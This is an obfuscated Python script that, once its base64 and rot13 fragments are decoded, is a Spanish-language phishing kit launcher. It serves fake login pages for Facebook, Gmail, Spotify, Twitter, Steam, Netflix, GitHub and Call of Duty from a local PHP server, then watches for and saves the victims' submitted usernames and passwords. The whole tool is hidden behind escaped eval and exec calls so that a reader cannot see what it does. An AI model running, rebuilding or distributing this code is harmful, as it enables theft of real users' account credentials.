import base64, codecs
magic = 'aW1wb3J0IHRpbWUKaW1wb3J0IG9zCgpkZWYgbWVudSgpOgogICBvcy5zeXN0ZW0oImNsZWFyIikKICAgcHJpbnQoIiIiXDAzM1s5Mm0KIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paI4paIICAgIOKWiOKWiCDilojiloggICAgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paIICAg4paI4paIIOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paIICAg4paI4paIIArilojiloggIOKWiOKWiOKWiOKWiCDilojilojilojiloggICDilojilogg4paI4paIICAgICDilojiloggICDilojilogg4paI4paIICAg4paI4paIIOKWiOKWiCDilojiloggICAgICDilojiloggICDilojiloggCuKWiOKWiCDilojilogg4paI4paIIOKWiOKWiCDilojiloggIOKWiOKWiCDilojiloggICAgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paI4paIIArilojilojilojiloggIOKWiOKWiCDilojiloggIOKWiOKWiCDilojilogg4paI4paIICAgICDilojiloggICAgICDilojiloggICDilojilogg4paI4paIICAgICAg4paI4paIIOKWiOKWiCAgIOKWiOKWiCAKIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paIICAg4paI4paI4paI4paIIOKWiOKWiCAgICAg4paI4paIICAgICAg4paI4paIICAg4paI4paIIOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paIICAg4paI4paICiAgICAgICAgICAgICAgIHYyLjAKICAgIiIiKQogICBwcmludCgiIiIKICAgICAgICAgICBUZW1wbGF0ZXMKIFsxXSBGYWNlYm9vayAgICBbMl0gR29vZ2xlIGdtYWlsICAgCiBbM10gU3BvdGlmeSAgICAgWzRdIFR3aXR0ZXIgIAogWzVdIFN0ZWFtICAgICAgIFs2XSBOZXRmbGl4ICAgICAKIFs3XSBHaXRodWIgICAgICBbOF0gQ2FsbCBPZiBEdXR5CiAgICIiIikKICAgbnVtYmVyID0gaW50KGlucHV0KCJcbj4+ICIpKQogICBpZiBudW1iZXIgPT0gMToKICAgICAgcHJpbnQoIlxuW35dIEluaWNpYW5kbyBzZXJ2aWRvciBwaHAuLi4iKQogICAgICBwcmludCgiW35dIFB1ZXJ0bzogODA4MCIpCiAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgb3Muc3lzdGVtKCJwaHAgLXQgcGFnZXMvRmFjZWJvb2sgLVMgbG9jYWxob3N0OjgwODAgPiAvZGV2L251bGwgMj4mMSAmIikKICAgICAgcHJpbnQoIlt+XSBFc3BlcmFuZG8gZGF0b3MuLi4iKQogICAgICB3aGlsZSBUcnVlOgogICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZSgncGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0Jyk6CiAgICAgICAgICAgICAgcHJpbnQoJyAnKQogICAgICAgICAgICAgIHByaW50KCdcblwwMzNbMzRtWyFdIERhdG9zIGVuY29udHJhZG9zIScpCiAgICAgICAgICAgICAgd2l0aCBvcGVuKCdwYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQnKSBhcyB1c2VyczoKICAgICAgICAgICAgICAgICBsaW5lcyA9IHVzZXJzLnJlYWQoKS5yc3RyaXAoKQogICAgICAgICAgICAgICAgIGlmIGxlbihsaW5lcykgIT0gMDoKICAgICAgICAgICAgICAgICAgICBwcmludCgnICcpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0IikKICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNhdCBwYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQgPj4gcGFnZXMvRmFjZWJvb2svdXN1YXJpb3MuZ3VhcmRhZG9zLnR4dCIpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJybSAtcmYgcGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0IikKICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5cMDMzWzkybVt+XSBVc3VhcmlvcyBndWFyZGFkb3MgZW46IHBhZ2VzL0ZhY2Vib29rL3VzdWFyaW9zLmd1YXJkYWRvcy50eHQiKQogICBlbGlmIG51bWJlciA9PSAyOgogICAgIHByaW50KCdcblt+XSBJbmljaWFuZG8gc2Vydmlkb3IgcGhwLi4uJykKICAgICBwcmludCgiW35dIFB1ZXJ0bzogODA4MCIpCiAgICAgdGltZS5z'
love = 'oTIypPtkXDbtVPNtVT9mYaA5p3EyoFtvpTujVP10VUOuM2ImY0qio2qfMFNgHlOfo2AuoTuip3D6BQN4ZPN+VP9xMKLioaIfoPNlCvLkVPLvXDbtVPNtVUOlnJ50XPWosy0tEKAjMKWuozEiVTEuqT9mYv4hVvxXVPNtVPO3nTyfMFOHpaIyBtbtVPNtVPNtnJLto3ZhpTS0nP5cp2McoTHbW3OuM2ImY0qio2qfMF91p3Iupzyipl50rUDaXGbXVPNtVPNtVPNtVUOlnJ50XPptWlxXVPNtVPNtVPNtVUOlnJ50XPqpoyjjZmAoZmEgJlSqVREuqT9mVTIhL29hqUWuMT9mVFpcPvNtVPNtVPNtVPO3nKEbVT9jMJ4bW3OuM2ImY0qio2qfMF91p3Iupzyipl50rUDaXFOuplO1p2IlpmbXVPNtVPNtVPNtVPNtVTkcozImVQ0tqKAypaZhpzIuMPtcYaWmqUWcpPtcPvNtVPNtVPNtVPNtVPOcMvOfMJ4boTyhMKZcVPR9VQN6PvNtVPNtVPNtVPNtVPNtVPOjpzyhqPtaVPpcPvNtVPNtVPNtVPNtVPNtVPOipl5mrKA0MJ0bVzAuqPOjLJqypl9Uo29aoTHiqKA1LKWco3ZhqUu0VvxXVPNtVPNtVPNtVPNtVPNtVT9mYaA5p3EyoFtvL2S0VUOuM2ImY0qio2qfMF91p3Iupzyipl50rUDtCw4tpTSaMKZiE29iM2kyY3ImqJSlnJ9mYzq1LKWxLJEipl50rUDvXDbtVPNtVPNtVPNtVPNtVPNto3Zhp3ymqTIgXPWloFNgpzLtpTSaMKZiE29iM2kyY3ImqJSlnJ9mYaE4qPVcPvNtVPNtVPNtVPNtVPNtVPOjpzyhqPtvKT5pZQZmJmxloIg+KFOIp3IupzyiplOaqJSlMTSxo3ZtMJ46VUOuM2ImY0qio2qfMF91p3Iupzyipl5aqJSlMTSxo3ZhqUu0VvxXVPNtMJkcMvOhqJ1vMKVtCG0tZmbXVPNtVPOjpzyhqPtaKT5osy0tFJ5cL2yuozEiVUAypaMcMT9lVUObpP4hYvpcPvNtVPNtpUWcoaDbVyg+KFODqJIlqT86VQtjBQNvXDbtVPNtVUEcoJHhp2kyMKNbZFxXVPNtVPOipl5mrKA0MJ0bVaObpPNgqPOjLJqypl9GpT90nJM5VP1GVTkiL2SfnT9mqQb4ZQtjVQ4tY2Eyqv9hqJkfVQV+WwRtWvVcPvNtVPNtpUWcoaDbVyg+KFOSp3OypzShMT8tMTS0o3ZhYv4vXDbtVPNtVUqbnJkyVSElqJH6PvNtVPNtVPOcMvOipl5jLKEbYzymMzyfMFtapTSaMKZiH3OiqTyzrF91p3Iupzyipl50rUDaXGbXVPNtVPNtVPNtVUOlnJ50XPptWlxXVPNtVPNtVPNtVUOlnJ50XPqpoyjjZmAoZmEgJlSqVREuqT9mVTIhL29hqUWuMT9mVFpcPvNtVPNtVPNtVPO3nKEbVT9jMJ4bW3OuM2ImY1Ajo3EcMaxiqKA1LKWco3ZhqUu0WlxtLKZtqKAypaZ6PvNtVPNtVPNtVPNtVPOfnJ5yplN9VUImMKWmYaWyLJDbXF5lp3ElnKNbXDbtVPNtVPNtVPNtVPNtnJLtoTIhXTkcozImXFNuCFNjBtbtVPNtVPNtVPNtVPNtVPNtpUWcoaDbWlNaXDbtVPNtVPNtVPNtVPNtVPNto3Zhp3ymqTIgXPWwLKDtpTSaMKZiH3OiqTyzrF91p3Iupzyipl50rUDvXDbtVPNtVPNtVPNtVPNtVPNto3Zhp3ymqTIgXPWwLKDtpTSaMKZiH3OiqTyzrF91p3Iupzyipl50rUDtCw4tpTSaMKZiH3OiqTyzrF91p3Iupzyipl5aqJSlMTSxo3ZhqUu0VvxXVPNtVPNtVPNtVPNtVPNtVT9mYaA5p3EyoFtvpz0tYKWzVUOuM2ImY1Ajo3EcMaxiqKA1LKWco3ZhqUu0VvxXVPNtVPNtVPNtVPNtVPNtVUOlnJ50XPWpoyjjZmAoBGWgJ35qVSImqJSlnJ9mVTq1LKWxLJEiplOyowbtpTSaMKZiH3OiqTyzrF91p3Iupzyipl5aqJSlMTSxo3ZhqUu0VvxXVPNtMJkcMvOhqJ1vMKVtCG0tAQbXVPNtVPOjpzyhqPtaKT5osy0tFJ5cL2yuozEiVUAypaMcMT9lVUObpP4hYvpcPvNtVPNtpUWcoaDbVyg+KFODqJIlqT86VQtjBQNvXDbtVPNtVUEcoJHhp2kyMKNbZFxXVPNtVPOipl5mrKA0MJ0bVaObpPNgqPOjLJqypl9Hq2y0qTIlVP1GVTkiL2SfnT9mqQb4ZQtjVQ4tY2Eyqv9hqJkfVQV+WwRtWvVcPvNtVPNtpUWcoaDbVyg+KFOSp3OypzShMT8tMTS0o3ZhYv4vXDbtVPNtVUqbnJkyVSElqJH6PvNtVPNtVPOcMvOipl5jLKEbYzymMzyfMFtapTSaMKZiIUqcqUEypv91p3Iupzyipl50rUDaXGbXVPNtVPNtVPNtVUOlnJ50XPptWlxXVPNtVPNtVPNtVUOlnJ50XPqpoyjjZmAoZmEgJlSqVREuqT9mVTIhL29hqUWuMT9mVFpcPvNtVPNtVPNt'
god = 'ICB3aXRoIG9wZW4oJ3BhZ2VzL1R3aXR0ZXIvdXN1YXJpb3MudHh0JykgYXMgdXNlcnM6CiAgICAgICAgICAgICBsaW5lcyA9IHVzZXJzLnJlYWQoKS5yc3RyaXAoKQogICAgICAgICAgICAgaWYgbGVuKGxpbmVzKSAhPSAwOgogICAgICAgICAgICAgICAgcHJpbnQoJyAnKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvVHdpdHRlci91c3Vhcmlvcy50eHQiKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvVHdpdHRlci91c3Vhcmlvcy50eHQgPj4gcGFnZXMvVHdpdHRlci91c3Vhcmlvcy5ndWFyZGFkb3MudHh0IikKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIHBhZ2VzL1R3aXR0ZXIvdXN1YXJpb3MudHh0IikKICAgICAgICAgICAgICAgIHByaW50KCJcblwwMzNbOTJtW35dIFVzdWFyaW9zIGd1YXJkYWRvcyBlbjogcGFnZXMvVHdpdHRlci91c3Vhcmlvcy5ndWFyZGFkb3MudHh0IikKICAgZWxpZiBudW1iZXIgPT0gNToKICAgICBwcmludCgnXG5bfl0gSW5pY2lhbmRvIHNlcnZpZG9yIHBocC4uLicpCiAgICAgcHJpbnQoIlt+XSBQdWVydG86IDgwODAiKQogICAgIHRpbWUuc2xlZXAoMSkKICAgICBvcy5zeXN0ZW0oInBocCAtdCBwYWdlcy9TdGVhbSAtUyBsb2NhbGhvc3Q6ODA4MCA+IC9kZXYvbnVsbCAyPiYxICYiKQogICAgIHByaW50KCJbfl0gRXNwZXJhbmRvIGRhdG9zLi4uIikKICAgICB3aGlsZSBUcnVlOgogICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoJ3BhZ2VzL1N0ZWFtL3VzdWFyaW9zLnR4dCcpOgogICAgICAgICAgcHJpbnQoJyAnKQogICAgICAgICAgcHJpbnQoJ1xuXDAzM1szNG1bIV0gRGF0b3MgZW5jb250cmFkb3MhJykKICAgICAgICAgIHdpdGggb3BlbigncGFnZXMvU3RlYW0vdXN1YXJpb3MudHh0JykgYXMgdXNlcnM6CiAgICAgICAgICAgICBsaW5lcyA9IHVzZXJzLnJlYWQoKS5yc3RyaXAoKQogICAgICAgICAgICAgaWYgbGVuKGxpbmVzKSAhPSAwOgogICAgICAgICAgICAgICAgcHJpbnQoJyAnKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvU3RlYW0vdXN1YXJpb3MudHh0IikKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiY2F0IHBhZ2VzL1N0ZWFtL3VzdWFyaW9zLnR4dCA+PiBwYWdlcy9TdGVhbS91c3Vhcmlvcy5ndWFyZGFkb3MudHh0IikKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIHBhZ2VzL1N0ZWFtL3VzdWFyaW9zLnR4dCIpCiAgICAgICAgICAgICAgICBwcmludCgiXG5cMDMzWzkybVt+XSBVc3VhcmlvcyBndWFyZGFkb3MgZW46IHBhZ2VzL1N0ZWFtL3VzdWFyaW9zLmd1YXJkYWRvcy50eHQiKQogICBlbGlmIG51bWJlciA9PSA2OgogICAgIHByaW50KCdcblt+XSBJbmljaWFuZG8gc2Vydmlkb3IgcGhwLi4uJykKICAgICBwcmludCgiW35dIFB1ZXJ0bzogODA4MCIpCiAgICAgdGltZS5zbGVlcCgxKQogICAgIG9zLnN5c3RlbSgicGhwIC10IHBhZ2VzL05ldGZsaXggLVMgbG9jYWxob3N0OjgwODAgPiAvZGV2L251bGwgMj4mMSAmIikKICAgICBwcmludCgiW35dIEVzcGVyYW5kbyBkYXRvcy4uLiIpCiAgICAgd2hpbGUgVHJ1ZToKICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKCdwYWdlcy9OZXRmbGl4L3VzdWFyaW9zLnR4dCcpOgogICAgICAgICAgcHJpbnQoJyAnKQogICAgICAgICAgcHJpbnQoJ1xuXDAzM1szNG1bIV0gRGF0b3MgZW5jb250cmFkb3MhJykKICAgICAgICAgIHdpdGggb3BlbigncGFnZXMvTmV0ZmxpeC91c3Vhcmlvcy50eHQnKSBhcyB1c2VyczoKICAgICAgICAgICAgIGxpbmVzID0gdXNlcnMucmVhZCgpLnJzdHJpcCgpCiAgICAgICAgICAgICBpZiBsZW4obGluZXMpICE9IDA6CiAgICAgICAgICAgICAgICBwcmludCgnICcpCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNhdCBwYWdlcy9OZXRmbGl4L3VzdWFyaW9zLnR4dCIpCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNhdCBwYWdlcy9OZXRmbGl4L3VzdWFyaW9zLnR4dCA+PiBwYWdlcy9O'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
